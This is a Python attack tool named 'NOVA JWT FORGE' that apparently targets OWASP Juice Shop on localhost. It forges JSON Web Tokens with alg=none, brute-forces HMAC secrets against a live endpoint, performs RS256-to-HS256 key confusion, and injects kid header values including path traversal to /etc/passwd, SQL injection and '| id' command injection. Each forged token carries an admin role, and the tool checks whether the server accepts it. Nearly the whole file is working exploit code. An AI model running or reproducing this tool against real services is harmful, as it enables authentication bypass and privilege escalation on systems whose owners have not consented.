#!/usr/bin/env python3
"""
NOVA JWT FORGE v1.0
Complete JWT exploitation engine:
- Algorithm confusion (alg:none, HMAC→RSA, etc.)
- Key cracking (weak HMAC secrets)
- Token forgery and manipulation
- Kid header injection
- JKU/JWK header attacks
"""

import json
import base64
import hmac
import hashlib
import time
import re
import requests
from datetime import datetime
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor


class NovaJWTForge:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Nova/4.0 (JWT Forge)",
            "Accept": "application/json",
        })
        self.forged_tokens = []

    @staticmethod
    def decode_jwt(token):
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "Not a valid JWT", "parts_found": len(parts)}
        result = {"raw": token, "parts": {}}
        for i, name in enumerate(["header", "payload", "signature"]):
            try:
                padded = parts[i] + "=" * (4 - len(parts[i]) % 4)
                decoded = base64.urlsafe_b64decode(padded)
                try:
                    result["parts"][name] = json.loads(decoded.decode())
                except:
                    result["parts"][name] = decoded.decode(errors="replace")
            except Exception as e:
                result["parts"][name] = f"ERROR: {str(e)[:50]}"
        return result

    def analyze_token(self, token):
        decoded = self.decode_jwt(token)
        if "error" in decoded:
            return decoded
        analysis = {"decoded": decoded, "vulnerabilities": [], "attack_surface": {}}
        header = decoded["parts"].get("header", {})
        payload = decoded["parts"].get("payload", {})
        alg = header.get("alg", "unknown")
        analysis["algorithm"] = alg

        if alg == "none":
            analysis["vulnerabilities"].append({"type": "alg_none", "severity": "CRITICAL", "desc": "alg=none accepts empty signature"})
        elif alg and alg.startswith("HS"):
            analysis["attack_surface"]["hmac_brute_force"] = True
            analysis["vulnerabilities"].append({"type": "weak_hmac", "severity": "HIGH", "desc": f"HMAC {alg} - secret may be brute-forced"})
        elif alg and alg.startswith("RS"):
            analysis["attack_surface"]["rsa_to_hmac"] = True
            analysis["vulnerabilities"].append({"type": "rsa_hmac_confusion", "severity": "HIGH", "desc": "RSA algorithm - check RS256→HS256 confusion"})

        if "kid" in header:
            analysis["attack_surface"]["kid_injection"] = True
            analysis["vulnerabilities"].append({"type": "kid_present", "severity": "MEDIUM", "desc": f"kid: {header['kid'][:50]}"})
        if "jku" in header:
            analysis["vulnerabilities"].append({"type": "jku_header", "severity": "HIGH", "desc": f"jku: {header['jku'][:50]}"})

        if "exp" in payload:
            exp_time = datetime.fromtimestamp(payload["exp"])
            if exp_time < datetime.now():
                analysis["vulnerabilities"].append({"type": "expired_token", "severity": "LOW", "desc": "Token expired"})

        return analysis

    def forge_alg_none(self, payload):
        header = {"alg": "none", "typ": "JWT"}
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
        token = f"{header_b64}.{payload_b64}."
        self.forged_tokens.append({"attack": "alg_none", "token": token})
        return token

    def _try_hmac_key(self, parts, secret, algorithm="HS256"):
        header_b64, payload_b64, _ = parts
        message = f"{header_b64}.{payload_b64}".encode()
        hash_func = getattr(hashlib, algorithm.replace("HS", "sha").lower(), hashlib.sha256)
        sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), message, hash_func).digest()).rstrip(b"=").decode()
        return f"{header_b64}.{payload_b64}.{sig}"

    def brute_force_hmac(self, token, max_workers=20):
        wordlist = ["secret", "key", "password", "admin", "jwt_secret", "juice-shop", "juiceshop",
                     "owasp", "changeme", "123456", "admin123", "test", "dev", "private_key",
                     "super_secret", "my_secret_key", "secret_key", "your-256-bit-secret",
                     "secret123", "jwtkey", "thisisasecretkey", "supersecretkey", "notsecure"]
        wordlist = list(set(wordlist + [w.upper() for w in wordlist] + [w.capitalize() for w in wordlist]))
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "Invalid token"}
        
        print(f"\n  🔑 Brute-forcing HMAC secret ({len(wordlist)} candidates)...")
        results = {"found": False, "secret": None, "forged_token": None}
        
        def test_secret(s):
            try:
                forged = self._try_hmac_key(parts, s)
                resp = self.session.get(f"{self.base_url}/rest/user/whoami",
                    headers={"Authorization": f"Bearer {forged}"}, timeout=5)
                if resp.status_code == 200 and len(resp.text) > 100:
                    return s, forged
            except:
                pass
            return None, None

        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = [ex.submit(test_secret, s) for s in wordlist]
            for f in futures:
                secret, forged = f.result()
                if secret:
                    results["found"] = True
                    results["secret"] = secret
                    results["forged_token"] = forged
                    print(f"  🔥 SECRET FOUND: '{secret}'")
                    break
        
        if not results["found"]:
            print(f"  ❌ Secret not found")
        return results

    def forge_rsa_to_hmac(self, payload, public_key_pem, algorithm="HS256"):
        header = {"alg": algorithm, "typ": "JWT"}
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
        message = f"{header_b64}.{payload_b64}".encode()
        hash_func = getattr(hashlib, algorithm.replace("HS", "sha").lower())
        sig = base64.urlsafe_b64encode(hmac.new(public_key_pem.encode(), message, hash_func).digest()).rstrip(b"=").decode()
        token = f"{header_b64}.{payload_b64}.{sig}"
        self.forged_tokens.append({"attack": "rsa_to_hmac", "token": token})
        return token

    def forge_kid_injection(self, payload, kid_payload, hmac_secret="secret", algorithm="HS256"):
        header = {"alg": algorithm, "typ": "JWT", "kid": kid_payload}
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
        message = f"{header_b64}.{payload_b64}".encode()
        hash_func = getattr(hashlib, algorithm.replace("HS", "sha").lower(), hashlib.sha256)
        sig = base64.urlsafe_b64encode(hmac.new(hmac_secret.encode(), message, hash_func).digest()).rstrip(b"=").decode()
        token = f"{header_b64}.{payload_b64}.{sig}"
        self.forged_tokens.append({"attack": "kid_injection", "token": token})
        return token

    def validate_token(self, token, endpoint="/rest/user/whoami"):
        result = {"token_preview": token[:50], "endpoint": endpoint, "accepted": False, "status_code": None}
        try:
            resp = self.session.get(f"{self.base_url}{endpoint}",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            result["status_code"] = resp.status_code
            result["response_preview"] = resp.text[:200]
            if resp.status_code == 200 and len(resp.text) > 100:
                result["accepted"] = True
                if "admin" in resp.text.lower():
                    result["privilege"] = "admin"
        except Exception as e:
            result["error"] = str(e)[:100]
        return result

    def run_full_forge(self, token):
        print("""
╔══════════════════════════════════════╗
║   🔐 NOVA JWT FORGE v1.0           ║
╚══════════════════════════════════════╝""")
        
        report = {"timestamp": datetime.now().isoformat(), "attacks": [], "successful_forgeries": []}
        
        # Analyze
        print("\n📊 Token Analysis:")
        analysis = self.analyze_token(token)
        report["analysis"] = analysis
        print(f"   Algorithm: {analysis.get('algorithm', 'unknown')}")
        for v in analysis.get("vulnerabilities", []):
            print(f"   ⚠️ [{v['severity']}] {v['desc'][:70]}")
        
        decoded = self.decode_jwt(token)
        payload = decoded.get("parts", {}).get("payload", {})
        admin_payload = payload.copy() if isinstance(payload, dict) else {}
        admin_payload["role"] = "admin"
        admin_payload["isAdmin"] = True
        
        # alg=none
        print("\n🔨 alg=none Attack:")
        none_token = self.forge_alg_none(admin_payload)
        v = self.validate_token(none_token)
        report["attacks"].append({"type": "alg_none", "validation": v})
        print(f"   {'🔥 ACCEPTED!' if v['accepted'] else '❌ Rejected'} ({v['status_code']})")
        if v["accepted"]:
            report["successful_forgeries"].append(none_token)
        
        # HMAC brute force
        if analysis.get("attack_surface", {}).get("hmac_brute_force"):
            print("\n🔨 HMAC Brute Force:")
            bf = self.brute_force_hmac(token)
            report["attacks"].append(bf)
            if bf.get("found"):
                # Forge admin token with cracked secret
                admin_b64 = base64.urlsafe_b64encode(json.dumps(admin_payload).encode()).rstrip(b"=").decode()
                parts = token.split(".")
                forged = self._try_hmac_key([parts[0], admin_b64, ""], bf["secret"])
                v = self.validate_token(forged)
                report["attacks"].append({"type": "hmac_admin_forge", "validation": v})
                print(f"   Admin forge: {'🔥 ACCEPTED!' if v['accepted'] else '❌'}")
        
        # RSA→HMAC confusion
        if analysis.get("attack_surface", {}).get("rsa_to_hmac"):
            print("\n🔨 RSA→HMAC Key Confusion:")
            for key in ["public_key", "ssh-rsa AAAAB3NzaC1yc2E", "test"]:
                try:
                    confused = self.forge_rsa_to_hmac(admin_payload, key)
                    v = self.validate_token(confused)
                    report["attacks"].append({"type": "rsa_to_hmac", "key": key[:30], "validation": v})
                    if v["accepted"]:
                        print(f"   🔥 KEY CONFUSION WORKS with key='{key[:30]}'!")
                        report["successful_forgeries"].append(confused)
                        break
                except:
                    pass
            else:
                print(f"   ❌ Key confusion failed")
        
        # kid injection
        if analysis.get("attack_surface", {}).get("kid_injection"):
            print("\n🔨 kid Injection:")
            for kid in ["../../../etc/passwd", "' UNION SELECT 1--", "| id"]:
                kid_token = self.forge_kid_injection(payload, kid)
                v = self.validate_token(kid_token)
                report["attacks"].append({"type": "kid_injection", "kid": kid, "validation": v})
                status = "🔥" if v["accepted"] else "❌"
                print(f"   {status} kid='{kid}': {v['status_code']}")
        
        with open("nova_jwt_forge_report.json", "w") as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"\n✅ JWT Forge complete. {len(report['successful_forgeries'])} tokens forged.")
        return report


if __name__ == "__main__":
    forge = NovaJWTForge()
    token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiJ9LCJpYXQiOjE3NzgwNzI5MDMsImV4cCI6MTc3ODA3NjUwM30.YqYw0gV2c-jHLlVe2m2hPZdOe8FoIGWXaG3OL3B6o7lYsX3A4FqYs3Y3dQzP3Xh1Y7YtY7YtY7YtY7YtY7Y"
    report = forge.run_full_forge(token)
